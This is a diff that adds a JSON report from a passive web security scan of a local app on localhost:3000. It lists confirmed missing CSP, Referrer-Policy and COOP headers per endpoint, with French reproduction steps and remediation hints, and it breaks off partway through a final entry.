@@ -1,0 +1,4377 @@
+[
+  {
+    "id": "FIND-a3682bb1",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-eee0190c"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-3368af3f",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-eee0190c"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-3ffcdcdf",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-eee0190c"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-4d956ecc",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-d6631946"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-a37a54a7",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-d6631946"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-ce71c900",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-d6631946"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-b11dd7c8",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000//ipinfo.io"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-bb810efa"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000//ipinfo.io",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-be94d9e9",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000//ipinfo.io"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-bb810efa"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000//ipinfo.io",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d72372fc",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000//ipinfo.io"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-bb810efa"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000//ipinfo.io",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-381b5ba3",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/engine.io"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-da39fa80"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/engine.io",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-03a4f27b",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/engine.io"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-da39fa80"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/engine.io",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-fba253fa",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/engine.io"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-da39fa80"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/engine.io",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-65ef3f7c",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Products"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-e8b242cc"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Products",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-155f2c07",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Products"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-e8b242cc"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Products",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-12e14c67",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Products"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-e8b242cc"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Products",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-87291f97",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/captcha"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-74eeb8a4"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/captcha",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-a42bac10",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/captcha"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-74eeb8a4"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/captcha",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-dab44555",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/captcha"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-74eeb8a4"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/captcha",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-fb47a849",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/SecurityQuestions"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-c4854cd8"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/SecurityQuestions",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-2c561d6c",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/SecurityQuestions"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-c4854cd8"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/SecurityQuestions",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-88122181",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/SecurityQuestions"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-c4854cd8"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/SecurityQuestions",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-e771a937",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/user/security-question?email="
+    ],
+    "proof": {
+      "observations": [
+        "OBS-e71aeafd"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/user/security-question?email=",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-60c48a7d",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/user/security-question?email="
+    ],
+    "proof": {
+      "observations": [
+        "OBS-e71aeafd"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/user/security-question?email=",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-c9d28d16",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/user/security-question?email="
+    ],
+    "proof": {
+      "observations": [
+        "OBS-e71aeafd"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/user/security-question?email=",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-0ba9bdf0",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Quantitys"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-aa8fb4e3"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Quantitys",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d2552848",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Quantitys"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-aa8fb4e3"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Quantitys",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-6b5a34a2",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Quantitys"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-aa8fb4e3"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Quantitys",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-91ea43ae",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Deliverys"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-96d9d98a"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Deliverys",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-833bbcf7",
